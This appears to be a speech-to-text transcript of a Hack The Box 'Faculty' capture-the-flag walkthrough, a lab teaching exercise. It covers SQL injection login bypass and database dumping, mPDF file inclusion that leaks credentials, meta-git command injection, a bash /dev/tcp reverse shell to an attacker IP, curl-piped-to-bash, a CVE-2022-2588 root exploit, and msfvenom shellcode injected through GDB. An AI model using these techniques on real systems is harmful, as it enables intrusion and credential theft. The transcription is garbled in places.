 what's going on YouTube this is ipsack we're doing faculty from hack the box which starts off with one of the most SQL injectable web apps I have ever seen oddly enough the only thing you have to do is bypass login with SQL injection which is pretty easy but we're going to spend some more time do SQL injection on an update statement because well why not I don't think I've done that before so it's fun to show but the route to get onto the box is through a PDF generation portion of the web app that uses mpdf as a library essentially you supply it some HTML it generates a PDF so you can use HTML annotations to add a file to that PDF and leak files on the box which includes web source code so you can leak the PHP config file that says how to connect to the database get a password reuse that password to log into the box through SSH there's a few prevasks on this box but the coolest one is GDB has the P Trace capability which I think is poker Trace which allows you to just inject Shell Code it into any running process so with that being said let's just jump in as always we're going to start off with a n map so Dash SC for default scripts as V enumerate versions OA I'll put all formats put in the nmap directory and call it faculty and then the IP address which is 10 10 11 169. this can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on Port 22 and its Banner tells us it's an Ubuntu box the next thing we have is HTTP on Port 80. its Banner tells us its engine X also running on Ubuntu and it also tells us the HP title is faculty.hdb so we should edit our host file to say that so 10 10 11 169 and http faculty.htb so with that being said let's go browse the website so I'm going to go to 10 10 11 169 and it should redirect me to faculty.htb which uh did I screw up 10 10 11 169. oh um I have HTTP here so let's get rid of that and then refresh this and we get to the login system um it asks us for a student ID number so we're just going to enter things and we just keep getting it is incorrect so let's try some basic SQL injection if I put a single quote here I'm just seeing if it says the number is incorrect as well if it said like some type of formatting error or gave us a error message we knew right off the bat it would be SQL injectable um we can try or one equals one and then put a comment and we get logged into this application so um the first thing I want to do is just a go Buster before you get too far so go Buster Dash U HTTP uh faculty.htb then Dash X for extension PHP because it is a PHP web app as we see in these extensions and the interesting thing is it's an engine X server that is running PHP generally you see it as Apache but at least when it's not using a um framework such as lauravol I see larval using nginx quite a bit but these things that are just like a DOT PHP file generally I see them hosted on Apache uh let's do Dash W for word list opt seclist Discovery web content rapsmallwords.txt and then let's see um go Buster Dash H is there a cookie option let's see username follow redirect Dash C cookies are used for the request so I'm going to do Dash C and let's pull my cookie out of here so when our go Buster runs it's running as an authenticated user since well we're authenticated so PHP says ID so let's just do PHP SAS ID equals um that's not looking right and it erased shoot let's login again okay copy this paste put the thing in quotes we need to put this in dur mode and right off the bat we do have a slash admin so we should check that out so I'm going to go to slash admin and we get looks like the administration page so clicking on course list we have a list of courses and a course form if we click on edit it looks like we can create a new course so that's going to be the first thing I try so let's send this over into burp Suite go on a proxy tab intercept this send it over to repeater and then I'm going to turn Firefox off refresh the page because anything we edit we just want to see it live and this is going to be like a second order SQL injection because this is an update statement so I'm not getting the information back um I'm just changing in the database and then it says one which I'm guessing means success refresh and we see the course is please subscribe so the next thing I'm going to do is a single quote to see exactly what happens we don't have any information here didn't say one and going here it still says Please Subscribe I'm gonna say thank you because I know you subscribed and what I said uh refreshing we still don't have it so we can confirm when it says one that means it probably updated the database so let's add a comment after this we see one refresh and uh oh um this is like every dba's worst nightmare um we updated every single course um that's definitely not good so let's take a step back at exactly what happened here um because up SQL injections and updates I don't think it talked about that much so um generally when you do an SQL injection you do a select statement then they select some um values and then from some tables where and this is going to be your SQL injection right um this is where your user input is I'm going to move node.txt to notes.sh and now we have syntax highlighting so it makes it a bit prettier I guess so when we do injects here and we add a like um comment like this and then anything the code has afterwards gets ignored nothing bad happens because we're really far into this statement right well an update statement looks like this update table name set and then I think it's just the column name or um like set what is this course equal to value where and then I'm guessing there's an ID here yep there's an ID so ID is equal to one like this and actually it's letting us set the description as well and I want to say that's just a comma so description is equal to value 2. so it's kind of like this but we did SQL injection all the way over here and injected a comment so the where Clause got dropped so it went into the table and set the course for our value for everything right so when we do SQL injection at least in a union um we should be conscious of the um where statement so now I'm going to update this to be please subscribe hit enter and we go back to the page refresh and we only changed it on the first one so um always be careful with SQL injections at least on updates so the next piece of the puzzle is we have to put some Dynamic variable in here and we could play with this so if I do like Plus at version we get nothing if I just do add at version with the comment here um it's going to say at at version so we really need to find a way to put Dynamic content in and we can't use like concat or something because we're already in open quotes but we can update something else so I'm going to do that comma and then description is equal to and we'll just say thank you and see what happens here so we get a one that's good refresh and we have Please Subscribe thank you so now since I have full control over this like full control meaning I can edit the first apostrophe I can just do add at version if I type that correctly and then we refresh and we have Dynamic content here um we could also do like user to see the username refresh and get that but the main thing we want to do is extract the database right so what I'm going to do is put a SQL query in here and the easiest way to do that is just in parentheses so now the description should be set to one it is so we can just write a query here and this is my sequel so we just want to extract data out of the information schema table the first one we want to extract is schema name and this can be the database name so select schema name from information schema Dot schemata like this and we don't get a one so our query has failed if we refresh the description still has not changed and I'm guessing because this returned like multiple rows and this isn't expecting multiple rows so this is expecting it to return like a string and we returned a array or list so what we're going to do is a group concat on this schema name and that's going to take all the rows it returns and return them as one line and we see one right here and then we can refresh this page and we see two databases information schema and scheduling DB so now I'm just going to save this and I'm going to call this DBS and then we will control R to open up a new one because we want to take other information so we want to extract the table name and then put a colon in and the column name and that's going to be from information schema and then the columns table and we're going to say where table schema this is going to be the database is equal to let me just copy and paste this scheduling DB like this and we did not get a good thing so we screwed up somewhere um let's see select group concat table name column name from information schema Dot columns where table schema is equal to schedulingdb I think that's correct but it's telling me otherwise so let's simplify this oh I have a double quote right here what column name is there we go so now the page is going to load and we should have a dump of all the columns so now let me paste this and then we're going to do is said so I did colon percent s I'm going to search for comma and replace it with a return we can just delete these rows up here and now we will list of all the tables and their columns um I'm looking at faculty I don't see password here so I'm not really that interested unless I want to like um extract all the emails from faculty but I'm not interested in that all I want is creds and I can see there is a user's table so user and then we got username password and type so let's extract this actually we got name two we'll extract everything so let's do group concat select all right we'll do dump DB um description I guess I forget what it's called um it's maybe schema or something but so let's go back here to the group concat and what we want to steal is ID then what was it name ID name username then password and type I believe was the last one and then we just have to do from oh let's see when group concat and the parenthesis there from users there we go refresh this page and we'll get a list of every user and we got one administrator admin and one so V credits and I know this is not crackable so I'm not even going to try but something is odd um I'm looking at this page my name is Smith John this is administrator um what's going on and the answer to that is there's two vulnerabilities in play um we got the SQL injection here right but there's another sqm objection here if we just do name is a or one equals one like this we log in and now we're administrator um what I'm guessing is there's no access control check on this page so it's more of an eye door rep like vulnerability I guess maybe like and I don't know what it is um it's bad right there's no sense of uh privileges in this web app it seems so we logged in as what I appear I guess is a student with the ID we hit admin and the web apps like you know the location of the admin here it is right there's no permission checks in this page it's awful um and if you Google like The Faculty scheduling system we can find the source code because this is just on I want to say like codester or something let's see let's do this go to Google let's see exploitdb source code PHP it's yeah Source codester like anything you see on this website just assume it's vulnerable um so we could have done static code analysis and figured everything out but um I prefer going this like whole Black Box style right so doing this SQL injection was a complete rabbit hole but I found it cool because I got to show the update syntax which I don't think I have on ipsec.rocks so um I wanted to add that the actual vulnerability is within this um PDF thing so let's intercept this um this will be dump users and turn intercept off on intercept this PDF data generated oh um we blocked a pop-up window let's allow pop-ups and we get this PDF right but how this works if we intercept it we can see just a Big base64 Blob so what I'm going to do is Echo and then we'll base64--diet if I can type correctly and we see it's URL encoded it looks like so whenever I see double encodings my first thing is just go over to cyber chef because it makes it so quick to do these type of things I gotta turn burp Suite off uh let's see cyber chef and where is it this is just me the source code right the first one I always like ignore the first result because I just assume it's an ad um so we got base64 here we can do from base64 then your LD code we see it looks like it was double URL encoded so I'm going to do another URL decode and here we have um pretty much what we saw in this PDF I don't have it anymore refresh click this and we can see what we have in the PDF is here and most the time when people see this type of vulnerability they're just like well um I guess you can create phishing documents out of this because you can make legitimate looking PDFs people often forget that when this HTML is processed by the PDF engine there's a chance to include things off the server or make the server do things right so I'm going to disable all of these and we're going to do a double URL encode because we just want to be able to create the same base64 okay and then what I'm going to do is base64 so we do two and then we can edit this and we'll just do HTML ipsec bold ipsec and all I'm doing right here with this payload is um testing if I can write HTML which in the back of my mind I know I can but I'd like to see it anyways so I'm going to probably put this in repeater it gave us this PDF and do we have what saved we do so I can just do this and we see ipsec twice once in bold awesome so in the next step I'm going to do sudo NC lvnp 80. and what I'm going to do here is go back and we're going to try a iframe and see if we can make the server reach back to us um if we can make the server reach back to us it doesn't have any like sanitization whatsoever uh the next thing would be like trying to include files off the server so 10 10 14 8 like this and then we can close it copy paste refresh and we actually don't have to download this PDF because we're trading a vulnerability when it's generated and it's not coming back to us so this um did not trigger anything like I guess we could open the PDF and see what happens but any vulnerability there would be on us right I was trying to trigger a vulnerability when the PDF is created on the server so let's just try this refresh the page oh not found so it's automatically deleting PDFs but this not found let's just do this quickly I guess and the PDF doesn't reach back to us either we do see mpdf here and if I download this let's do a W get and examine it with exif tool we can see mpdf version 6.0 and we could search this for exploits um generally if I don't find exploits publicly um and look for the source code so mpdf GitHub because I assume this is open source it is and then I would go over to the issues and search these right so I'm going to take the is open off and I'm just going to type security and we can see vulnerabilities in this so we got ssrf open Action annotation tags so if we look at this it looks like one ability mpdf that's odd I guess maybe I need XML and then it works I'm going to try copying this real quick I honestly don't know this will this work if it's XML and not this and I could be doing this piece wrong because when I initially did the Box I did not look for that so let's try this pseudo NC lvnp 80. it does well um I did not realize we could trigger it that way is this one open still no it's closed so out of curiosity let's go back to cyber chef if I do file colon slash Etsy pass WD I do three slashes so it always goes to the root directory that was intentional not a typo uh let's paste this put this in go here and paste it XML it doesn't look like it includes the file right um just for a CNA check I'm going to W get this and then we're going to go to places home and then what is it hdb faculty and then this one is P6 here it is so we don't have the Etsy pass WD included but we can make the server reach back to us which is pretty cool um so that's another vulnerability I guess so let's go to The annotation tag and this one's talking more about lfi so let's try this so copy and then go to cyber chef paste this copy burp Suite paste copy browser there's a lot of jumping around right now put this in uh we don't have anything here let's try a w get see what it looks like locally ends in YK right here we do have this little button here and clicking it opens up past WD and this is going to be of the server so we have a few users here so I'm just going to copy this V I'm going to call it pass WD paste it and what I'm going to do is grep for everything that ends in sh on pass WD and we can see there's likely three using the Box root G borla I don't know how to pronounce that and developer so we can close this out and at this point we should just be looking at the source code right so let's go here um annotation file I wonder if I just can do like index.php and if it will grab some PHP source code so let's paste this in go to repeater paste send copy change this file name ends in BS where is BS there it is open and we have the index.php and I did this because I'm looking for where the database is so maybe that's going to be in login.php or header.php we probably want those two files so what I'm going to do is we're going to try something let's see annotation file okay oh the content I did not update oh well so what I want I wanted two files so I'm going to be greedy and try including both of them at once so we want to try including login.php and header so let's change this login.php [Music] and title attach file login.php X position I'll do 95. and this one is just going to be header.php we can make this bigger I guess okay so is it's going to attach to files that is the question paste it we can do a W get ends in c y k c y a we have two I think so this is login.php and I don't see anything about the database let's grab this this is going to be header and we still don't have anything related to the database oh DB connect I'm blind it is here so in login.php there is a dbconnect.php include so let's go and grab that and since this source code was public I mean we could have just downloaded the source code and found all the files that way but I kind of find Value in doing this to find out how you would have found it black box right since we can extract PHP Swiss code um share the files like I was trying to grab right so we got this we can copy go over to burp Suite paste it in do it curl or W get on this ends in z something no no here it is and I'm going to copy this into VDB PHP uh was it dbconnect.php just to make it a bit easier to read and we have a username of sked and then a potential password Here so let's save this cut it out so we can copy easier and I'm going to try sshing in with these users right and if we went back here to or grep we have three potential users um I'm not even going to try root because normally root login is disabled especially with passwords so we'll try gabolo first 169. paste in the password and we get logged in and if I had a lot of users I'd probably use like crack map exec with SSH but if it's only one or two um keep it easy and just manually try it is what I'd say the first thing I generally do whenever I log into a box as a user is check sudo and we can see that the user can run this file called metagit so the first thing I do is like a file against it and we see it's a Sim link uh it looks like it's a node module so I'm going to copy just less it and we can indeed see at something um so my first instinct is looking at that pseudo rule again actually so we can execute the command and I'm guessing we can do it with arguments as well so um let's go to like GTFO bins and we can see if metagit is here it is not and then I can just Google like metagit rce to see if there's any like vulnerabilities and right off the bat we have this post on Snick and also um hacker one and it looks like Nick is referring to a hack of one report these look like they are the same thing so we can see let's see uh whoops I was just trying to turn it direct mode um reporter rce in this steps to reproduce it looks like they just do a metagit clone and then some type of command injection here so let's copy this let's do sudo Dash U and then developer and then we can paste this and I'm going to do temp and test so now if I just do lsla on temp uh we do not see it created so git clone C what if we just do a colon LS temp nothing let's see spawn been sh permission denied change dur I don't know exactly what it is doing here what if I go into temp we do this and it works so oddly enough um I guess the studio was taking um keeping my home directory and then because it kept my home directory it could didn't have permission because I was switching to the developer user um I'm guessing something weird like that just happened but we can see this file does exist so my next thing is I'm going to go to Dev shm I'm just going to create shell.sh we'll call it bin bash and then bash Dash I Dev TCP 10 10 14 8 9001 zerat and one like that okay let's see H mod plus X show dot sh and I'm just going to test it looks like it works so let's listen again go back into temp and we can go do this pseudo command again and this time I'm just going to execute devshm test.sh hit enter I wonder does this name have to be unique nope see if we do Bash exit with error no such follow directory test.sh um I wonder if we don't have the ability to change directories that did not work so student Su developer metaclone no such follow directory Dev shmtest.sh foreign so where's my touch command that worked if I touch Dev shm test oh I'm doing test.sh and it's shell.sh Ops to have the right file name ah so let's now um Pixar TTY so I'm gonna do sdty Dash a rows 26 columns 105. actually instead of fixing our TTY do we have an SSH key we can just ssh in there's the sh directory cat ID RSA and we can just copy this to log in so copy the developer dot key paste it chmod 600 sh Dash I developer at 10 10 11 169. awesome so now we have a proper shell we can exit this which will close that one exploit and we're the developer user so I'm going to do sudo-l and we don't know the password there's this send mail um oh so gbolo had some mail here just I guess hinting at the existence of the get thing but don't have a password so let's just check this user's con tab to make sure the send mail is being ran by him and there isn't like a parent cron tab as the root and since I did contact L it's going to show me my users cron tab which shows I am executing it if this was like the Etsy cront tab file we'd have to see a username as well so I can just look at this you can see the usernames in this but if I did not see this send mail.sh thing in here I'd find out exactly how this thing's getting executed but now I know developer is executing it so I'm just going to go over to Lin piece now to see if that tells me anything so I'm going to go to limpies GitHub uh it looks like I already have it in my history so let me just go there uh we go to the root of the GitHub good releases and then we can download this so uh let's make duh dub dub dub dub you get it and then python3 Dash M hcp server Pearl 10 10 14 8 8 000 Lin P's dot sh pipe it over to bash and when this is finished hopefully it tells us what we have to do okay so now that Lin piece is done let's go to the top and we can find it so scrolling down looks like it is vulnerable to cve 20 22 2588 I don't know what this one is so let's check it out um looks like there's a GitHub right here for it and is it as simple as just executing if it is we can test it never in this not intended on this box but um looks like it's a relatively new cve oh what does it test it on does it say uh centers Ubuntu 17 18 19 and 20. I'm guessing this is in that so it probably will work so let's try this so wget let's just make sure it's a elf it is not so uh maybe I'll just do a git clone that'll be the fastest and then CP cve 2022 this over top of it and let's do a w get 10 10 14 8 8 000 and then exp file credential chmod plus X and execute it I don't know my cell just died I did dot slash S and then um it just stopped working did my VPN just die ping 10 10 11 169. looks like I can't reach it so I'm gonna power the box back on and we'll try it okay so I just had to reconnect to the VPN um let's just execute this and see what happens so it's starting the exploit number of cores doing some things and it looks like it succeeded so cat Etsy past WD said it wrote to this file and we have user so it looks like it did right I don't know what this password is does this tell us what it set the password to um let's see password the password is user so su-user password is user do ID and since they created this user with a uid of 0 is effectively root and we can get root.txt that way so yep that cve works that is definitely a unintended path to this machine but let's go back to the limpies so curl 1010 Okay so at winpies that cve works to pop this box going down this is going to be the running processes I don't really see anything too interesting there scrolling down I'm just going to go to the capabilities because that's what I want so capabilities and looking at all these files that have capabilities this one stands out because I don't know what gstreamer is um but it only has capnet bind servers and capnet admin so we could potentially exploit this to um listen on ports and I think do like a TCP dump so maybe if we're supposed to look at Network traffic uh we should go down this chain but the more interesting one is GDB has capsis P trace and this is poker trace this essentially means we can use GDB to inject code into other processes so what I'm going to do is I guess we can confirm if we do get cap on GDB uh which GDB git cap user bin GDB we can confirm we do have this uh P Trace so if we're going to inject into a process um we should use Shell Code because that's going to be what gets executed so I'm going to do msf Venom Dash um list payloads and we want to get to the reverse shell TCP because I just want to have msf venom send us a shell we could do other things we could have like the system execute a reverse shell on dev shm show.sh uh we could like make bash set uid there's a bunch of things we can do but reverse shells are always fun um and it's reverse TCP so that's windows we want Linux maybe it's shell reverse TCP encrypted Windows Windows Solaris Ruby python I think it's just Linux x64 if I don't find it soon x86 this is a 64-bit machine so here's the payload we want I'm gonna do msf Venom Dash p specify the payload then L host is 10 10 14 8. teleport is equal to 9001 um we're gonna do format python and dash out I'll call this um rev shell dot pi and it's an important notation that this is the shell underscore reverse TCP that means it's a stage list payload every piece of the payload is into this exploit if it was shell slash reverse TCP this would be a staged payload which means it's only got a stub that reaches out to somewhere else to get the rest of it to execute um and if it was the one with the slash we just have to use like msf Handler because um it wouldn't have the full reverse shell now the reason why I got it in Python format is we're going to have to convert this into we're going to change the ndns right because if we just executed this and injected it straight into memory we don't want to inject it like this um because it's actually looking for uh let's see I want to say it starts at 6A 99 is the first Cisco and it reads it backwards at a time right and the reason why this is one two three four five this is only five bytes in is because the payload itself is not divisible by eight um everything's going to be divisible by 8 this is 74 bytes so this is two off I believe so 72 we need 80 bytes so if this was let's see let's just do the code first and then we'll explain it I think that will be the easier route so what we have to do first is um let's move it to a different pane so I can open up two things easily so we're going to call this one rev shell uh was I in www yeah I was let's just move that up okay I'm gonna do python three we'll do Python 3 Dash I rev shell and what that's going to do is execute the script and then drop me into an interpreter so if I do Len buff we see it is 74. now I'm going to do a modulo 8 so that's percent if I can find the percent key eight and it's two and all this does is divide 74 by 8 and tell us the remainder right so um 8 times 864 so 8 times 9 would be 72. um and this is 74. so the next piece up would be 80. so in order to go from 74 to 80 what we're going to do is this Len and then minus eight think um maybe another parenthesis there we go so 74 plus 6 is equal to 8. and this is going to come in handy because now we can pad the buff right so what I'm going to do go up here and we're going to say the buffer well I'll call it payload the payload is equal to uh backslash X90 this is going to be 90 and hex in assembly this is a knob or no operation means it does nothing so we're going to multiply that by this 8 minus the length of our buffer modulo eight and then plus buff so we save this and now all we did was put um six note knobs right up here so the next piece we have to do is um convert the ndns right so I'm going to do 4 I in range 0 the length of the buffer then eight and all I'm doing here is I'm going range zero to um this will be 80 and I'm counting in a step I think that's what this one is called an eight so if I just printed I here right and then we execute this it's just going to print all the mult um I guess multiples of eight would be the right word to use rev shell if I had the right number of parentheses where is that mismatch it is saying it is up here so I have an extra parenthesis there we go so it just prints the multiples of eight right so now I can do some I guess it's binjitsu or string Jitsu whatever you want to call it and take this string eight characters at a time so I'm going to do payload and they're going to go I this is going to be the starting and then we're going to grab it up to eight characters after it so the first thing is going to be 0 to 8 then 8 to 16 and we're just gonna grab it and chunks like that and then because we have to swap the endginess which means reverse the byte format we're just going to do um a negative one like this and then the next thing we have to do is convert each byte into hex so we can print it out so what I'm going to do is for a bite and chunk so I'm going to go through each byte in this chunk and we're going to create a variable called chunks and this is just going to start with 0x and we can say uh we can append the chunks um then F string and then the byte and hex format and at the end if I print chunks we can see what this looks like um we should print chunks here whoops so this is what it looks like and this is because of the padding this is going to be the six knobs so one two three four five six so let's go back here and it starts at the let's see 6a29 and then let's see so what we did with the reverse byte format so we got five eight nine nine so one two three four five six seven eight so five E we have 5e up here zero one zero one here six a six a five F five F so that's why we reversed it because that's how it's going to want it in memory so I really hope that makes sense um the Indians knowing when to do it is always a pain so now that we have this what we want to do is instead of just printing the chunks we want to print it in a format that we can use with GDB and in 64-bit rip is the instruction pointer um I don't know what the r stands for but IP is instruction pointer so instead of just print chunks we're going to print and then we're going to say set long and I'm doing it in double brackets here because I'm in an F string if I just did this because it's this F string it would try to like templatize or whatever you want to call it this long and since there's no variable long it would just error out or do nothing so that's why I do these double because that's how you escape the brackets and F strings and now we can say rip Plus and then we want I so this would be plus 0 plus 8 plus whatever right and then is equal to chunks okay so now if I execute this we can see what it's doing it's going to set rip at zero so the current register to this variable and that's the very first thing and then rip plus eight to the next and so on so now when we copy this we can go to wherever shell is or um or SSH session I should say and we want to use GDB on any process that's running in root and a good thing to note is this will probably crash the process because we're just going to attach a debugger and then say the instruction pointer is now here we're not doing anything to save with the instruction pointer currently is so there's no way for the code to return back to where it naturally was after this so when we pick a process um we're definitely going to want to pick a process that um will die and funnily enough because we did the exploit all the root things says it is user now um so let's see Su Dash can I fix this real quick because that is annoying that's E-Pass WD we delete this from pass WD please say I didn't screw up the box sweet we still have root okay so now when I do this it's showing me all the root processes and the one that sticks out to me is like the sleep 20. because if we crash a sleep command the worst that's going to happen is the Sleep finishes early and hopefully that doesn't cause an issue but like if we did um engine X we could crash the web server we don't want to crash SSH because that's where we are um maybe modem banjo be a good one because I can't imagine us using a modem but I'm gonna do sleep 20 or the Sleep command because if I crash sleep who cares I assume the sleep's gonna happen again so if I do um P grip sleep we only get one PID so I can do GDB Dash p to attach to a process and I'm going to do P grep sleep so now we're going to attach to the Sleep process and we're here um I could do let's see X slash X or IP to examine it and what we're going to do is change it so let's copy all of our code here to overwrite this do the set and now if I do this x slash X on um rip we can see it's going to start at our knobs and then it's going to go into our Shell Code so I'm just going to hit C to continue and we get a connection if I do ID here we are root so I can go CD slash root and then we can cat root dot text and voila so um that is essentially How We Do The Box the intended way I hope you guys enjoyed that video take care and I will see you all next time